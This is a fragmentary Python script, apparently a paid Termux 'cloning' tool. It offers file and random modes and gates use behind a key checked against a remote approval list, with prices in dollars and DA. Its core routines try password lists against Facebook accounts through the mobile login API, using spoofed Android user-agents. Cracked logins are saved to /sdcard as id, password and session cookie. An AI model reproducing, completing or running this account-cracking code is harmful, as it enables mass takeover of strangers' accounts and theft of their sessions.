...
os.system('clear')
print(f'\x1b[38;5;46m[\x1b[1;97m=\x1b[38;5;46m] HAKIMAMERI ')
try:
    import requests 
except ImportError:
...
def menu():   
    clear()
    print(f'{A}[{A}1{A}]{A} FILE CLONING')
    print(f'{A}[{A}2{A}]{A} RANDOM CLONING')
    print(f'{A}[{A}3{A}]{A} CONTACT TOOL OWNER')
    print(f'{A}[{A}0{A}]{A} EXIT TOOLS')
    linex()
    select = input(f'{A}[{A}?{A}]{A} CHOICE {A}:{G1} ')
    if select =='1':
        _file_()
    elif select =='2':
        _randm_()
    elif select =='3':
        os.system('xdg-open https://t.me/Abdullha_404');menu()
    elif select =='0':
...
def superuser():
    ...
    id = "5".join(uuid)
    print(logo)
    DARK=requests.get("https://github.com/Qweyuii/blob/main/Approval.txt").text
    if id in DARK:
        Main()
    else:
        os.system("clear")
        #os.system("xdg-open https://www.facebook.com/Alex.500?mibextid=ZbWKwL")
        time.sleep(3.0)
        
        os.system("clear")
        print(logo)
        print("\t\033[1;37m   [\033[1;37m\033[1;37m First Get Approvel\033[1;37m\033[1;37m]")
        print ("")
        print (f'{A}  Your Key :'+UMO+id)
        print ("")
        ...
        print(f'{A}  [ • ]{G1} 5$ For10 Days')
        print ("")
        print(f'{A}  [ • ]{G1} 15$ For30 Days')
        print ("")
        print(f'{A}  [ • ]{G1} 500.DA For10 Days')
        print ("")
        print(f'{A}  [ • ]{G1} 1500.DA For30 Days')
        print ("")
...
#__________________[ FILE METHOD M1 ]__________________#           
    def methodA(self, sid, name, psw):
        try:
            global oks,cps,loop
            ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+"[FBAN/FB4A;FBAV/480.0.0.55.88;FBBV/455016452;FBDM/{density=1.0,width=1080,height=1080};FBLC/zh_CN;FBCR/China Mobile;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-C736V;FBSV/13.5.3;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
            ...
            for pw in psw:
                ...
                if 'session_key' in q:
                    ...
                    break
                     ...
                     open('/sdcard/EHC-M1-FILE-OK.txt','a').write(sid+'|'+ps+'\n')
                     cps.append(sid)
                else:
                    continue
            loop+=1
...
def randm(ids,psd):
    global loop,ok,cp
    sys.stdout.write(f"\r{G1}[{A}EHC-XYLON{G1}]{A}-{G1}[{A}{loop}{G1}]{A}-{G1}[{A}OK{G1}/{A}CP{G1}]{A}-{G1}[{A}{len(ok)}{G1}/{A}{len(cp)}{G1}] ")
    sys.stdout.flush()
    try:
        for pas in psd:
            data={'adid':str(uuid.uuid4()),
            ...
            if 'access_token' in q:
                ...
                open('/sdcard/EHC-XYLON-OK.txt','a').write(uid+'|'+pas+'|'+coki+'\n')
                ok.append(uid)
                break
            else:continue
        loop+=1
